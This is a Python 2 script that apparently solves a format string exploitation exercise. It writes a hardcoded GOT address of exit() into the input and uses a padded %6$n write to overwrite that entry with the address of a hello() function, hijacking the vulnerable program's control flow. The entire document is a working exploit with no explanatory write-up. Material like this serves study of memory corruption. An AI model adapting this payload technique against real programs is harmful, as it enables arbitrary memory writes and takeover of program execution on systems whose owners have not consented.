#!/usr/bin/python2.6

import struct

def pad(s, length=500):
    assert(len(s) <= length)
    return (s+"A"*length)[:length]

buf_sz = 512

# In this address, the address of exit is stored. Located in .got.plt section
# We can also confirm it by looking at the .rel.plt section
got_plt__exit = 0x08049724
hello_addr = 0x080484b4

allignment_padding = ""
before_padding = "AAAA" + "AAAA"
target_address = struct.pack("P", got_plt__exit)
after_padding = "BBBB" + "BBBB"

payload = allignment_padding + before_padding + target_address + after_padding
payload = payload + " 0x%6$08x "

target_value = hello_addr   # Value that we want to write
field_width_padding = target_value - (
    len(allignment_padding) +
    len(before_padding)     +
    len(target_address)     +
    len(after_padding)      +
    3+8+1
)
# For some reason, trying to add a "\n" character messes up the printed output
payload = payload + "%" + str(field_width_padding) + "d%6$n"

payload = pad(
    payload,
    buf_sz-1, # fgets()  reads  in  at  most one less than size characters from stream
)
print(payload)
